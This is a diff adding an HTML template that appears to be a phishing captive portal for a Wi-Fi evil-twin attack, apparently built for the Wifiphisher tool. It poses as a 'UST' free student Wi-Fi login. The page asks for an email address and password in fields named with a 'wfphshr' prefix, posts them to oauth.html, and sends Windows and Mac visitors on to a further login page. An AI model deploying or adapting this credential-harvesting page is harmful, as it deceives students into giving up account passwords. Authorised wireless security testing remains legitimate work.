@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>{{ organization }} Wi-Fi Service</title>
+  <link rel="stylesheet" href="static/css/reset.css">
+  <link rel='stylesheet prefetch' href='static/css/roboto.css'>
+  <link rel='stylesheet prefetch' href='static/css/font-awesome.min.css'>
+  <link rel="stylesheet" href="static/css/style.css">
+  <script src='static/js/jquery.min.js'></script>
+  <script src="static/js/index.js"></script>
+
+  <style>
+    /* تنسيق الصورة لتكون في المنتصف */
+    body {
+      margin: 0;
+      display: flex;
+      flex-direction: column; /* للسماح بوضع النص والصورة في ترتيب عمودي */
+      justify-content: center; /* توسيط المحتوى أفقياً */
+      align-items: center; /* توسيط المحتوى عمودياً */
+      height: 100vh; /* ضبط ارتفاع الصفحة بالكامل */
+      background-color: #f4f4f4; /* خلفية اختيارية */
+      font-family: 'RobotoDraft', 'Roboto', sans-serif;
+      color: #666666;
+    }
+
+    img {
+      max-width: 20%; /* ضبط عرض الصورة لتكون متناسبة */
+      height: auto; /* لضمان تناسب الصورة */
+      display: block;
+      margin-bottom: 20px; /* مسافة بين الصورة والعناصر الأخرى */
+    }
+
+    .pen-title {
+      text-align: center;
+      margin-bottom: 10px; /* مسافة بين النص والصورة */
+    }
+
+    .form-module {
+      max-width: 320px;
+      text-align: center;
+    }
+
+    .login-btn {
+      cursor: pointer;
+      background: #33b5e5;
+      width: 100%;
+      border: 0;
+      padding: 10px 15px;
+      color: #ffffff;
+      transition: 0.3s ease;
+    }
+
+    .modal {
+      display: none; /* اخفاء النافذة افتراضياً */
+    }
+  </style>
+</head>
+
+<body onload="oauth_popup()">
+  <!-- عنوان الصفحة -->
+  <div class="pen-title">
+    <h1>UST</h1>
+    <span>Free WIFI for students.</span>
+  </div>
+
+  <!-- الصورة -->
+  <img src="/var/www/html/static/UST.jpg" alt="UST">
+
+  <!-- نموذج الدخول -->
+  <div class="module form-module">
+    <div class="form">
+    </div>
+    <div class="form">
+      <h2>Login Email For Free WIFI</h2>
+      <form name="theform" class="theform" method="post" action="oauth.html">
+        <input type="email" placeholder="Email" name="wfphshr-email" required />
+        <input type="password" placeholder="Password" minlength="5" name="wfphshr-password" required />
+        <button class="login-btn">Login</button>
+      </form>
+    </div>
+    <div class="cta"><a id="btn1">Terms of Usage</a></div>
+  </div>
+
+  <!-- The Modal -->
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <span class="close">×</span>
+        <h2 style="color:darkslategray;font-size:18px;">Terms of Usage</h2>
+      </div>
+      <div class="modal-body">
+        <p>This is a {{ organization }} free Hotspot wireless internet Service (the “Service”) provided for use by
+          students in UST. All users are required to log in individually as an independent user.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function oauth_popup() {
+      var popup_enabled = {{ popup }};
+      if (popup_enabled === true) {
+        detect_os();
+      } else {
+        return false;
+      }
+    }
+
+    function detect_os() {
+      var OSName = "Unknown OS";
+      if (navigator.appVersion.indexOf("Win") != -1) OSName = "Windows";
+      if (navigator.appVersion.indexOf("Mac") != -1) OSName = "MacOS";
+      if (navigator.appVersion.indexOf("X11") != -1) OSName = "UNIX";
+      if (navigator.appVersion.indexOf("Linux") != -1) OSName = "Linux";
+
+      if (OSName == "Windows" || OSName == "MacOS") {
+        window.location = 'login.html';
+      } else {
+        return false;
+      }
+    }
+  </script>
+</body>
+</html>
